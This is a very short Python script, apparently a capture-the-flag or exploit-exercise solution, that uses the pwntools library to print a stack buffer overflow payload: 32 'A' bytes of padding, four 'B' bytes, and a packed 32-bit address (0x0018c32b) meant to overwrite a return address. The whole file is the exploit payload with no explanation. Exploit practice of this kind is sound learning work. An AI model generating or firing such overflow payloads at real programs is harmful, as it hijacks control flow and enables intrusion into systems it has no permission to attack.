#!/bin/python

from pwn import *

print("A"*32 +"B"*4 + p32(0x0018c32b))
